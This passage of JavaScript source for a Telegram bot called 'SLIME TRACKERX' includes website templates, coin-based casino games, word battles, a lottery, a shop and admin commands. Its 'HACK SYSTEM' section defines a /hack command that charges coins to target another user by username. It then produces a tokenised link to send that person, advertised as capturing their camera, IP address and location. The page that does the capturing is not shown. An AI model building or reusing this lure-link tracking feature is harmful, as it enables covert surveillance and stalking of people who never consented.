  gaming: (data) => `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${data.gamertag || 'Gamer'} | 🎮 SLIME TRACKERX</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0a; color: #0f0; font-family: 'Orbitron', monospace; overflow-x: hidden; }
        
        .glitch { position: relative; animation: glitch 3s infinite; }
        @keyframes glitch {
            0%, 100% { text-shadow: 3px 0 red, -3px 0 blue; }
            50% { text-shadow: -3px 0 red, 3px 0 blue; }
        }
        
        .navbar { background: rgba(0,0,0,0.95); padding: 20px; border-bottom: 2px solid #0f0; text-align: center; font-size: 24px; font-weight: bold; position: sticky; top: 0; z-index: 1000; letter-spacing: 2px; }
        
        .hero { height: 100vh; display: flex; align-items: center; justify-content: center; text-align: center; background: radial-gradient(circle at center, #1a1a1a 0%, #0a0a0a 100%); }
        .hero h1 { font-size: 5rem; margin-bottom: 20px; }
        .hero p { font-size: 1.2rem; margin-bottom: 30px; color: #0f0; }
        
        .btn { background: #0f0; color: #000; padding: 15px 40px; border: none; cursor: pointer; font-weight: bold; margin: 10px; transition: 0.3s; font-family: 'Orbitron', monospace; }
        .btn:hover { transform: scale(1.1); box-shadow: 0 0 20px #0f0; }
        
        .games { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 20px; padding: 60px 40px; max-width: 1200px; margin: 0 auto; }
        .game-card { background: #1a1a1a; border: 1px solid #0f0; border-radius: 10px; padding: 30px; text-align: center; transition: 0.3s; cursor: pointer; }
        .game-card:hover { transform: scale(1.05); box-shadow: 0 0 20px #0f0; background: #0f0; color: #000; }
        .game-card i { font-size: 3rem; margin-bottom: 15px; }
        
        .social { text-align: center; padding: 40px; }
        .social a { color: #0f0; text-decoration: none; margin: 0 15px; font-size: 24px; transition: 0.3s; }
        .social a:hover { transform: scale(1.2); display: inline-block; }
        
        footer { text-align: center; padding: 40px; border-top: 1px solid #0f0; }
        
        @media (max-width: 768px) {
            .hero h1 { font-size: 2rem; }
            .games { padding: 20px; }
        }
    </style>
</head>
<body>
    <div class="navbar">🎮 ${data.gamertag || 'GAMING HUB'} 🔥</div>
    
    <div class="hero">
        <div>
            <h1 class="glitch">${data.gamertag || 'GAMER'}</h1>
            <p>${data.tagline || 'Level Up Your Game'}</p>
            <button class="btn" onclick="window.open('https://twitch.tv/${data.twitch || 'gamer'}', '_blank')">▶ Watch Live</button>
        </div>
    </div>
    
    <div class="games">
        <div class="game-card">
            <i class="fas fa-gamepad"></i>
            <h3>🎮 ${data.game1 || 'Apex Legends'}</h3>
            <p>Predator Rank</p>
        </div>
        <div class="game-card">
            <i class="fas fa-crosshairs"></i>
            <h3>⚔️ ${data.game2 || 'Valorant'}</h3>
            <p>Radiant Player</p>
        </div>
        <div class="game-card">
            <i class="fas fa-trophy"></i>
            <h3>🏆 ${data.game3 || 'CS:GO'}</h3>
            <p>Global Elite</p>
        </div>
    </div>
    
    <div class="social">
        <a href="#"><i class="fab fa-twitch"></i></a>
        <a href="#"><i class="fab fa-youtube"></i></a>
        <a href="#"><i class="fab fa-discord"></i></a>
        <a href="#"><i class="fab fa-twitter"></i></a>
    </div>
    
    <footer>
        <p>🎮 ${data.gamertag || 'Gamer'} | 🔥 Built with SLIME TRACKERX</p>
    </footer>
</body>
</html>`,
  
  restaurant: (data) => `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${data.restaurant || 'Restaurant'} | 🍽️ SLIME TRACKERX</title>
    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;500;600;700;800;900&family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Poppins', sans-serif; background: #fffaf5; }
        
        .header { background: linear-gradient(135deg, #8B4513 0%, #A0522D 100%); color: white; text-align: center; padding: 80px 20px; }
        .header h1 { font-size: 4rem; font-family: 'Playfair Display', serif; margin-bottom: 20px; }
        .header p { font-size: 1.2rem; opacity: 0.9; }
        
        .menu { max-width: 800px; margin: 60px auto; padding: 0 20px; }
        .category { margin: 40px 0; }
        .category h2 { color: #8B4513; border-bottom: 3px solid #8B4513; padding-bottom: 10px; margin-bottom: 20px; font-family: 'Playfair Display', serif; }
        .item { display: flex; justify-content: space-between; padding: 15px; border-bottom: 1px dashed #ddd; transition: 0.3s; }
        .item:hover { background: #fff0e0; padding-left: 20px; }
        .item-name { font-weight: 600; }
        .item-price { color: #8B4513; font-weight: 700; }
        .item-desc { font-size: 0.85rem; color: #666; margin-top: 5px; }
        
        .specials { background: linear-gradient(135deg, #ffe4b5, #ffd49a); padding: 40px; border-radius: 20px; margin: 40px 0; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
        .specials h3 { font-size: 1.8rem; color: #8B4513; margin-bottom: 10px; }
        
        .info { background: #1a1a2e; color: white; text-align: center; padding: 60px 20px; margin-top: 60px; }
        .info h2 { margin-bottom: 30px; font-family: 'Playfair Display', serif; }
        .info p { margin: 10px 0; }
        
        footer { background: #0f0f1a; color: white; text-align: center; padding: 30px; }
        
        @media (max-width: 600px) {
            .header h1 { font-size: 2rem; }
            .item { flex-direction: column; }
            .specials { padding: 20px; }
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>🍽️ ${data.restaurant || 'Restaurant'}</h1>
        <p>${data.cuisine || 'Fine Dining'} | ${data.hours || '11AM - 10PM'}</p>
    </div>
    
    <div class="menu">
        <div class="specials">
            <h3>🍕 Today's Special</h3>
            <p>${data.special || 'Chef\'s Special - 20% OFF on all main courses!'}</p>
        </div>
        
        <div class="category">
            <h2>🍤 Appetizers</h2>
            <div class="item">
                <div><div class="item-name">${data.app1 || 'Bruschetta'}</div><div class="item-desc">Fresh tomatoes, basil, garlic on toasted bread</div></div>
                <div class="item-price">$${data.app1_price || '8'}</div>
            </div>
            <div class="item">
                <div><div class="item-name">${data.app2 || 'Calamari'}</div><div class="item-desc">Crispy fried calamari with marinara sauce</div></div>
                <div class="item-price">$${data.app2_price || '12'}</div>
            </div>
        </div>
        
        <div class="category">
            <h2>🥩 Main Course</h2>
            <div class="item">
                <div><div class="item-name">${data.main1 || 'Grilled Salmon'}</div><div class="item-desc">Fresh Atlantic salmon with lemon butter sauce</div></div>
                <div class="item-price">$${data.main1_price || '24'}</div>
            </div>
            <div class="item">
                <div><div class="item-name">${data.main2 || 'Ribeye Steak'}</div><div class="item-desc">12oz ribeye with garlic mashed potatoes</div></div>
                <div class="item-price">$${data.main2_price || '32'}</div>
            </div>
        </div>
        
        <div class="category">
            <h2>🍰 Desserts</h2>
            <div class="item">
                <div><div class="item-name">${data.dessert1 || 'Tiramisu'}</div><div class="item-desc">Classic Italian dessert with coffee and mascarpone</div></div>
                <div class="item-price">$${data.dessert1_price || '7'}</div>
            </div>
        </div>
    </div>
    
    <div class="info">
        <h2>📞 Reserve Your Table</h2>
        <p>📍 ${data.address || '123 Food Street, Downtown'}</p>
        <p>📞 ${data.phone || '+1 234 567 8900'}</p>
        <p>📧 ${data.email || 'info@restaurant.com'}</p>
    </div>
    
    <footer>
        <p>🔥 Built with SLIME TRACKERX Web Creator</p>
        <p>© 2024 ${data.restaurant || 'Restaurant'}</p>
    </footer>
</body>
</html>`
};

// ========== WEB CREATOR COMMANDS ==========
bot.command("web", async (ctx) => {
  let message = "🌐 **DOPE WEB CREATOR** 🌐\n\nCreate stunning websites for just **15 COINS**!\n\n**Available Templates:**\n• portfolio - Modern Portfolio\n• business - Corporate Business\n• store - E-Commerce Store\n• gaming - Gaming Hub\n• restaurant - Restaurant Menu\n\n**Commands:**\n/createweb [template] - Create a website (15 coins)\n/mywebsites - View your websites\n\n**Example:** /createweb portfolio";
  await ctx.reply(message, { parse_mode: "Markdown" });
});

bot.command("createweb", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let template = args[1];
  let u = await initUser(ctx.from.id);
  
  const templates = ["portfolio", "business", "store", "gaming", "restaurant"];
  const questions = {
    portfolio: ["name", "title", "bio", "email", "skill1", "skill2", "skill3", "project1", "project1_desc", "project2", "project2_desc"],
    business: ["company", "tagline", "service1", "service1_desc", "service2", "service2_desc", "service3", "service3_desc", "email", "phone", "address"],
    store: ["store", "tagline", "product1", "product1_price", "product1_desc", "product2", "product2_price", "product2_desc", "product3", "product3_price", "product3_desc", "email"],
    gaming: ["gamertag", "tagline", "game1", "game2", "game3", "twitch", "youtube"],
    restaurant: ["restaurant", "cuisine", "hours", "special", "app1", "app1_price", "app2", "app2_price", "main1", "main1_price", "main2", "main2_price", "dessert1", "dessert1_price", "address", "phone", "email"]
  };
  
  if (!template || !templates.includes(template)) return ctx.reply("❌ Templates: portfolio, business, store, gaming, restaurant");
  if (u.coins < WEB_PRICE) return ctx.reply(`❌ Need ${WEB_PRICE} coins! You have ${u.coins}`);
  
  await takeCoin(ctx.from.id, WEB_PRICE);
  webBuilds.set(ctx.from.id, { template, step: 0, data: {}, questions: questions[template] });
  await ctx.reply(`✅ Selected: ${template}\n💰 -${WEB_PRICE} coins\n\n📝 Send me your ${questions[template][0]}:`);
});

bot.command("mywebsites", async (ctx) => {
  let websites = await Website.find({ ownerId: ctx.from.id });
  if (websites.length === 0) return ctx.reply("📭 No websites yet! Use /createweb [template]");
  let message = "🌐 **YOUR WEBSITES** 🌐\n\n";
  for (let site of websites) message += `• ${site.name}\n  🔗 ${site.url}\n  👁️ ${site.views} views\n\n`;
  await ctx.reply(message);
});

// ========== 1v1 WORD CHALLENGE ==========
bot.command("wordbattle", async (ctx) => {
  let args = ctx.message.text.split(" ");
  if (args.length < 4) {
    return ctx.reply(`📝 **1v1 WORD CHALLENGE**

Challenge a friend to spell words!

**Usage:** /wordbattle @username [amount] [difficulty]

**Difficulties:**
🍃 easy - 45 seconds (3-4 letters)
⚡ medium - 30 seconds (5-6 letters)
🔥 hard - 15 seconds (7-8 letters)
💀 expert - 8 seconds (9+ letters)

💰 Winner takes ALL coins!`, { parse_mode: "Markdown" });
  }
  
  let targetUsername = args[1];
  let betAmount = parseInt(args[2]);
  let difficulty = args[3].toLowerCase();
  
  if (!difficultyLevels[difficulty]) return ctx.reply("❌ Invalid difficulty! Use: easy, medium, hard, expert");
  if (isNaN(betAmount) || betAmount < WORD_MIN_BET) return ctx.reply(`❌ Minimum bet is ${WORD_MIN_BET} coins!`);
  if (betAmount > WORD_MAX_BET) return ctx.reply(`❌ Maximum bet is ${WORD_MAX_BET} coins!`);
  
  let targetId = null;
  for (let [id, u] of usersCache) {
    try {
      let c = await ctx.telegram.getChat(id);
      if (c.username === targetUsername.replace("@", "")) { targetId = id; break; }
    } catch(e) {}
  }
  if (!targetId) return ctx.reply("❌ User not found!");
  if (targetId === ctx.from.id) return ctx.reply("❌ Cannot battle yourself!");
  
  let user = await initUser(ctx.from.id);
  if (user.coins < betAmount) return ctx.reply(`❌ You need ${betAmount} coins to bet!`);
  
  let diff = difficultyLevels[difficulty];
  let letterCount = difficulty === "easy" ? (Math.random() < 0.5 ? 3 : 4) : difficulty === "medium" ? (Math.random() < 0.5 ? 5 : 6) : difficulty === "hard" ? (Math.random() < 0.5 ? 7 : 8) : 9;
  let targetWord = getRandomWordByLength(letterCount);
  
  wordChallenges.set(targetId, { from: ctx.from.id, fromUsername: ctx.from.username || ctx.from.first_name, bet: betAmount, difficulty, letterCount, targetWord, time: Date.now(), status: "waiting" });
  setTimeout(() => { let challenge = wordChallenges.get(targetId); if (challenge && challenge.status === "waiting") wordChallenges.delete(targetId); }, 60000);
  
  await ctx.reply(`✅ Word challenge sent to ${targetUsername}!\n💰 Bet: ${betAmount} coins\n${diff.color} Difficulty: ${diff.name}\n📏 Need a ${letterCount}-letter word\n⏱️ ${diff.timer} seconds timer`);
  await ctx.telegram.sendMessage(targetId, `📝 **WORD CHALLENGE!** 📝\n\n@${ctx.from.username || ctx.from.first_name} challenges you!\n💰 Bet: ${betAmount} coins\n${diff.color} Difficulty: ${diff.name}\n📏 Need a **${letterCount}-letter word**\n⏱️ Timer: ${diff.timer} seconds\n\nType /acceptword to accept!`);
});

bot.command("acceptword", async (ctx) => {
  let challenge = wordChallenges.get(ctx.from.id);
  if (!challenge) return ctx.reply("❌ No word challenge found!");
  if (challenge.status !== "waiting") return ctx.reply("❌ Challenge already accepted!");
  
  let accepter = await initUser(ctx.from.id);
  if (accepter.coins < challenge.bet) return ctx.reply(`❌ You need ${challenge.bet} coins to accept!`);
  
  await takeCoin(challenge.from, challenge.bet);
  await takeCoin(ctx.from.id, challenge.bet);
  
  let diff = difficultyLevels[challenge.difficulty];
  challenge.status = "active";
  challenge.currentTurn = "challenger";
  challenge.startTime = Date.now();
  wordChallenges.set(ctx.from.id, challenge);
  
  await ctx.telegram.sendMessage(challenge.from, `📝 **YOUR TURN!** 📝\n\nGive me a **${challenge.letterCount}-letter word**\n\nExample: ${challenge.targetWord}\n\n⏱️ You have ${diff.timer} seconds!\n💰 Total pot: ${challenge.bet * 2} coins`);
  
  setTimeout(async () => {
    let game = wordChallenges.get(ctx.from.id);
    if (game && game.status === "active" && game.currentTurn === "challenger") {
      game.status = "completed";
      wordChallenges.delete(ctx.from.id);
      await addCoin(ctx.from.id, challenge.bet * 2);
      let winner = await initUser(ctx.from.id);
      winner.wordWins++;
      winner.totalEarnedFromWords += challenge.bet * 2;
      await saveUser(ctx.from.id, winner);
      let loser = await initUser(challenge.from);
      loser.wordLosses++;
      await saveUser(challenge.from, loser);
      await addXP(ctx.from.id, 20);
      await addXP(challenge.from, 5);
      await ctx.telegram.sendMessage(ctx.from.id, `🎉 **YOU WIN!** 🎉\n\nChallenger timed out!\n💰 Won ${challenge.bet * 2} coins!`);
      await ctx.telegram.sendMessage(challenge.from, `💀 **YOU LOSE!** 💀\n\nYou ran out of time!\n💸 Lost ${challenge.bet} coins`);
    }
  }, diff.timer * 1000);
  
  await ctx.reply(`✅ Challenge accepted!\n💰 Both paid ${challenge.bet} coins\n📝 Challenger's turn!\n⏱️ ${diff.timer} seconds!`);
});

bot.command("declineword", async (ctx) => {
  if (wordChallenges.has(ctx.from.id)) {
    let challenge = wordChallenges.get(ctx.from.id);
    if (challenge.status === "waiting") {
      wordChallenges.delete(ctx.from.id);
      ctx.reply("✅ Word challenge declined!");
      await ctx.telegram.sendMessage(challenge.from, `❌ ${ctx.from.username || ctx.from.first_name} declined your challenge!`);
    }
  } else { ctx.reply("❌ No challenge found!"); }
});

bot.command("wordstats", async (ctx) => {
  let u = await initUser(ctx.from.id);
  let winRate = u.wordWins + u.wordLosses > 0 ? ((u.wordWins / (u.wordWins + u.wordLosses)) * 100).toFixed(1) : 0;
  await ctx.reply(`📝 **YOUR WORD BATTLE STATS**\n\n🏆 Wins: ${u.wordWins}\n💀 Losses: ${u.wordLosses}\n📊 Win Rate: ${winRate}%\n💰 Total Earned: ${u.totalEarnedFromWords} coins`);
});

// ========== HACK SYSTEM ==========
bot.command("hack", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let targetUsername = args[1];
  if (!targetUsername) return ctx.reply(`💀 **HACK USER** 💀\n\nUsage: /hack @username\n💰 Cost: ${TRACK_COST} coins\n📸 Captures camera + IP + location`);
  
  let user = await initUser(ctx.from.id);
  if (user.coins < TRACK_COST) return ctx.reply(`❌ Need ${TRACK_COST} coins!`);
  
  let targetId = null;
  for (let [id, u] of usersCache) {
    try { let c = await ctx.telegram.getChat(id); if (c.username === targetUsername.replace("@", "")) { targetId = id; break; } } catch(e) {}
  }
  if (!targetId) return ctx.reply("❌ User not found!");
  
  await useHack(ctx.from.id);
  let token = crypto.randomBytes(8).toString("hex");
  tokens.set(token, { chat: ctx.chat.id, user: ctx.from.id, target: targetId, time: Date.now() });
  setTimeout(() => tokens.delete(token), 600000);
  
  let hacker = usersCache.get(ctx.from.id);
  hacker.hackedUsers.push(targetId);
  await saveUser(ctx.from.id, hacker);
  await ctx.reply(`💀 **HACK INITIATED!** 💀\n🎯 Target: ${targetUsername}\n💰 Cost: -${TRACK_COST} coins\n⏱️ Expires: 10 minutes\n\n🔗 Send this link: ${DOMAIN}?token=${token}`);
});

// ========== NEW: CASINO GAMES ==========
bot.command("casino", async (ctx) => {
  await ctx.reply(`🎰 **CASINO GAMES** 🎰\n\n🎲 /blackjack [amount] - Play Blackjack\n🎡 /roulette [amount] [red/black/odd/even/number]\n🎰 /slots [amount] - Play Slots\n🎲 /dice [amount] - Roll the Dice\n\n🍀 /lottery buy [tickets] - Buy lottery tickets\n🏆 /lottery draw - Draw winner (auto daily)\n\n💰 Win big and multiply your coins!`);
});

bot.command("blackjack", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let bet = parseInt(args[1]);
  let u = await initUser(ctx.from.id);
  
  if (isNaN(bet) || bet < 10) return ctx.reply("❌ Minimum bet is 10 coins!");
  if (u.coins < bet) return ctx.reply(`❌ Need ${bet} coins!`);
  
  await takeCoin(ctx.from.id, bet);
  
  let playerCards = [Math.floor(Math.random() * 10) + 1, Math.floor(Math.random() * 10) + 1];
  let dealerCards = [Math.floor(Math.random() * 10) + 1, Math.floor(Math.random() * 10) + 1];
  let playerTotal = playerCards.reduce((a,b) => a+b, 0);
  let dealerTotal = dealerCards.reduce((a,b) => a+b, 0);
  
  while (dealerTotal < 17) {
    let newCard = Math.floor(Math.random() * 10) + 1;
    dealerCards.push(newCard);
    dealerTotal += newCard;
  }
  
  let result = "";
  if (playerTotal > 21) {
    result = `💀 BUST! You lose ${bet} coins!`;
  } else if (dealerTotal > 21 || playerTotal > dealerTotal) {
    let winAmount = bet * 2;
    await addCoin(ctx.from.id, winAmount);
    result = `🎉 WIN! +${winAmount} coins!`;
    u.casinoWins++;
    await saveUser(ctx.from.id, u);
  } else if (playerTotal === dealerTotal) {
    await addCoin(ctx.from.id, bet);
    result = `🤝 TIE! ${bet} coins returned!`;
  } else {
    result = `💀 LOSE! You lose ${bet} coins!`;
  }
  
  await ctx.reply(`🎰 **BLACKJACK**\n\nYour cards: ${playerCards.join(", ")} = ${playerTotal}\nDealer cards: ${dealerCards.join(", ")} = ${dealerTotal}\n\n${result}`);
});

bot.command("roulette", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let bet = parseInt(args[1]);
  let choice = args[2]?.toLowerCase();
  let u = await initUser(ctx.from.id);
  
  if (isNaN(bet) || bet < 5) return ctx.reply("❌ Minimum bet is 5 coins!");
  if (!choice) return ctx.reply("❌ Choose: red, black, odd, even, or a number 0-36");
  if (u.coins < bet) return ctx.reply(`❌ Need ${bet} coins!`);
  
  await takeCoin(ctx.from.id, bet);
  
  let number = Math.floor(Math.random() * 37);
  let color = "";
  let isOdd = number % 2 === 1;
  
  if (number === 0) color = "green";
  else if (number <= 10 || (number >= 19 && number <= 28)) color = number % 2 === 0 ? "black" : "red";
  else color = number % 2 === 0 ? "red" : "black";
  
  let win = false;
  let multiplier = 0;
  
  if (choice === "red" && color === "red") { win = true; multiplier = 2; }
  else if (choice === "black" && color === "black") { win = true; multiplier = 2; }
  else if (choice === "odd" && isOdd && number !== 0) { win = true; multiplier = 2; }
  else if (choice === "even" && !isOdd && number !== 0) { win = true; multiplier = 2; }
  else if (!isNaN(parseInt(choice)) && parseInt(choice) === number) { win = true; multiplier = 35; }
  
  if (win) {
    let winAmount = bet * multiplier;
    await addCoin(ctx.from.id, winAmount);
    await ctx.reply(`🎡 **ROULETTE**\n\nBall landed on: ${number} (${color})\n🎉 YOU WIN ${winAmount} coins!`);
  } else {
    await ctx.reply(`🎡 **ROULETTE**\n\nBall landed on: ${number} (${color})\n💀 YOU LOSE ${bet} coins!`);
  }
});

// ========== NEW: TOURNAMENT SYSTEM ==========
bot.command("tournament", async (ctx) => {
  let args = ctx.message.text.split(" ");
  if (args.length < 3) {
    return ctx.reply(`🏆 **TOURNAMENTS** 🏆\n\n/tournament create [name] [entryFee] - Create tournament\n/tournament join [id] - Join tournament\n/tournament list - List active tournaments\n/tournament start [id] - Start tournament (admin)\n\n💰 Winner takes the prize pool!`);
  }
  
  let action = args[1];
  
  if (action === "create" && ctx.from.id === OWNER_ID) {
    let name = args[2];
    let entryFee = parseInt(args[3]);
    let id = crypto.randomBytes(4).toString("hex");
    let tournament = new Tournament({ id, name, entryFee, prizePool: 0, players: [], status: "waiting" });
    await tournament.save();
    activeTournaments.set(id, tournament);
    await ctx.reply(`✅ Tournament "${name}" created!\nID: ${id}\nEntry Fee: ${entryFee} coins`);
  }
  else if (action === "join") {
    let id = args[2];
    let tournament = activeTournaments.get(id);
    if (!tournament) return ctx.reply("❌ Tournament not found!");
    if (tournament.players.includes(ctx.from.id)) return ctx.reply("❌ Already joined!");
    
    let user = await initUser(ctx.from.id);
    if (user.coins < tournament.entryFee) return ctx.reply(`❌ Need ${tournament.entryFee} coins!`);
    
    await takeCoin(ctx.from.id, tournament.entryFee);
    tournament.prizePool += tournament.entryFee;
    tournament.players.push(ctx.from.id);
    await tournament.save();
    await ctx.reply(`✅ Joined tournament "${tournament.name}"!\n💰 Prize pool: ${tournament.prizePool} coins`);
  }
  else if (action === "list") {
    let tours = Array.from(activeTournaments.values());
    if (tours.length === 0) return ctx.reply("📭 No active tournaments!");
    let msg = "🏆 **ACTIVE TOURNAMENTS** 🏆\n\n";
    for (let t of tours) {
      msg += `📛 ${t.name}\n🆔 ID: ${t.id}\n💰 Entry: ${t.entryFee} coins\n👥 Players: ${t.players.length}\n🏆 Prize: ${t.prizePool} coins\n\n`;
    }
    await ctx.reply(msg);
  }
});

// ========== NEW: LOTTERY SYSTEM ==========
bot.command("lottery", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let action = args[1];
  
  if (action === "buy") {
    let tickets = parseInt(args[2]) || 1;
    let cost = tickets * 5;
    let u = await initUser(ctx.from.id);
    
    if (u.coins < cost) return ctx.reply(`❌ Need ${cost} coins!`);
    
    await takeCoin(ctx.from.id, cost);
    lotteryPool += cost;
    for (let i = 0; i < tickets; i++) lotteryEntries.push(ctx.from.id);
    
    await ctx.reply(`🎫 Bought ${tickets} lottery tickets!\n💰 Jackpot: ${lotteryPool} coins!\n🍀 Good luck!`);
  }
  else if (action === "draw" && ctx.from.id === OWNER_ID) {
    if (lotteryEntries.length === 0) return ctx.reply("❌ No tickets sold!");
    let winnerId = lotteryEntries[Math.floor(Math.random() * lotteryEntries.length)];
    await addCoin(winnerId, lotteryPool);
    let winner = await getUsername(winnerId);
    await ctx.reply(`🍀 **LOTTERY DRAW!** 🍀\n\n🏆 Winner: @${winner}\n💰 Won: ${lotteryPool} coins!`);
    lotteryPool = 0;
    lotteryEntries = [];
  }
  else {
    await ctx.reply(`🍀 **LOTTERY** 🍀\n\n/lottery buy [tickets] - Buy tickets (5 coins each)\n💰 Current Jackpot: ${lotteryPool} coins\n\n🎁 Draw happens daily!`);
  }
});

// ========== NEW: DAILY QUESTS ==========
bot.command("quests", async (ctx) => {
  let u = await initUser(ctx.from.id);
  let today = new Date().toDateString();
  
  if (!u.dailyQuests[today]) {
    u.dailyQuests[today] = {
      playGames: 0,
      winGames: 0,
      referrals: 0,
      completed: false
    };
    await saveUser(ctx.from.id, u);
  }
  
  let quests = u.dailyQuests[today];
  let msg = `📋 **DAILY QUESTS** 📋\n\n`;
  msg += `🎮 Play 5 games: ${quests.playGames}/5 ${quests.playGames >= 5 ? '✅' : '❌'}\n`;
  msg += `🏆 Win 3 games: ${quests.winGames}/3 ${quests.winGames >= 3 ? '✅' : '❌'}\n`;
  msg += `👥 Get 2 referrals: ${quests.referrals}/2 ${quests.referrals >= 2 ? '✅' : '❌'}\n\n`;
  msg += `🎁 Complete all for 50 COINS!`;
  
  await ctx.reply(msg);
});

// ========== NEW: SHOP ==========
bot.command("shop", async (ctx) => {
  await ctx.reply(`🛒 **ITEM SHOP** 🛒\n\n💎 100 Diamonds - 50 coins\n🎫 Lottery Ticket - 5 coins\n🎁 Mystery Box - 20 coins (random reward!)\n⚡ XP Boost - 30 coins (2x XP for 1 hour)\n\nUse /buy [item] to purchase!`);
});

bot.command("buy", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let item = args[1]?.toLowerCase();
  let u = await initUser(ctx.from.id);
  
  const items = {
    "diamonds": { price: 50, reward: 100, type: "diamonds" },
    "ticket": { price: 5, reward: 1, type: "lottery" },
    "mystery": { price: 20, reward: "random", type: "mystery" }
  };
  
  if (!items[item]) return ctx.reply("❌ Items: diamonds, ticket, mystery");
  let shopItem = items[item];
  
  if (u.coins < shopItem.price) return ctx.reply(`❌ Need ${shopItem.price} coins!`);
  
  await takeCoin(ctx.from.id, shopItem.price);
  
  if (shopItem.type === "diamonds") {
    u.diamonds += shopItem.reward;
    await saveUser(ctx.from.id, u);
    await ctx.reply(`✅ Bought ${shopItem.reward} diamonds!`);
  } else if (shopItem.type === "lottery") {
    lotteryPool += 5;
    lotteryEntries.push(ctx.from.id);
    await ctx.reply(`✅ Bought 1 lottery ticket!\n💰 Jackpot: ${lotteryPool} coins`);
  } else if (shopItem.type === "mystery") {
    let rewards = [10, 20, 30, 50, 100, 200];
    let reward = rewards[Math.floor(Math.random() * rewards.length)];
    await addCoin(ctx.from.id, reward);
    await ctx.reply(`🎁 **MYSTERY BOX!**\n\nYou got ${reward} coins!`);
  }
});

// ========== ADMIN COMMANDS ==========
bot.command("admin", async (ctx) => {
  let user = await initUser(ctx.from.id);
  if (!user.isAdmin && ctx.from.id !== OWNER_ID) return ctx.reply("❌ Owner only!");
  await ctx.reply(`👑 **ADMIN PANEL**\n\n💰 /addcoin @user amount\n🎁 /gencode coins diamonds uses hours\n📋 /codes\n🗑️ /delcode CODE\n📢 /broadcast msg\n👥 /users\n📊 /stats\n🚫 /banuser @user\n✅ /unbanuser @user\n/giveall amount\n/topcoins\n/toprefs\n/restart\n🎰 /lottery draw\n🎥 /setwelcomegif - Set welcome GIF\n🎥 /removewelcomegif - Remove welcome GIF`);
});

bot.command("addcoin", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let args = ctx.message.text.split(" ");
  if (args.length < 3) return ctx.reply("Usage: /addcoin @user amount");
  let user = args[1].replace("@", "");
  let amt = parseInt(args[2]);
  if (isNaN(amt)) return ctx.reply("Amount must be number!");
  for (let [id, u] of usersCache) {
    try { let c = await ctx.telegram.getChat(id); if (c.username === user) { u.coins += amt; u.totalEarned += amt; await saveUser(id, u); await ctx.reply(`✅ +${amt} to @${user}\n💰 ${u.coins} coins`); return; } } catch(e) {}
  }
  await ctx.reply("❌ User not found!");
});

bot.command("gencode", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let args = ctx.message.text.split(" ");
  let coins = parseInt(args[1]) || 50;
  let diamonds = parseInt(args[2]) || 0;
  let uses = Math.min(parseInt(args[3]) || 20, 20);
  let hours = parseInt(args[4]) || 24;
  let code = await genCode(coins, diamonds, uses, hours);
  await ctx.reply(`✅ CODE GENERATED!\n\nCode: \`${code}\`\n💰 ${coins} coins\n💎 ${diamonds} diamonds\n🔄 ${uses} uses\n⏱️ ${hours} hours`, { parse_mode: "Markdown" });
});

bot.command("codes", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  if (codesCache.size === 0) return ctx.reply("📋 No active codes.");
  let msg = "📋 ACTIVE CODES:\n\n";
  for (let [c, d] of codesCache) msg += `\`${c}\` - ${d.coins} coins - ${d.left} uses left\n`;
  await ctx.reply(msg, { parse_mode: "Markdown" });
});

bot.command("delcode", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Usage: /delcode CODE");
  let code = args[1].toUpperCase();
  if (codesCache.has(code)) { codesCache.delete(code); await Code.deleteOne({ code: code }); await ctx.reply(`✅ Code ${code} deleted!`); }
  else { await ctx.reply(`❌ Code ${code} not found!`); }
});

bot.command("broadcast", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let msg = ctx.message.text.split(" ").slice(1).join(" ");
  if (!msg) return ctx.reply("Usage: /broadcast message");
  await ctx.reply("📢 Sending broadcast...");
  let s = 0, f = 0;
  for (let [id] of usersCache) {
    try { await ctx.telegram.sendMessage(id, `📢 ANNOUNCEMENT\n\n${msg}`); s++; } catch { f++; }
  }
  await ctx.reply(`✅ ${s} sent | ❌ ${f} failed`);
});

bot.command("users", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  if (usersCache.size === 0) return ctx.reply("📋 No users yet!");
  let msg = "📋 USERS LIST\n\n";
  let i = 0;
  let sortedUsers = Array.from(usersCache.values()).sort((a, b) => b.joinDate - a.joinDate);
  for (let u of sortedUsers) { i++; let username = await getUsername(u.userId); msg += `${i}. @${username} - ${u.coins} coins | 👥 ${u.referrals} refs\n`; if (i >= 20) break; }
  msg += `\nTotal: ${usersCache.size} users`;
  await ctx.reply(msg);
});

bot.command("stats", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  let total = 0, totalRefs = 0;
  for (let u of usersCache.values()) { total += u.coins; totalRefs += u.referrals; }
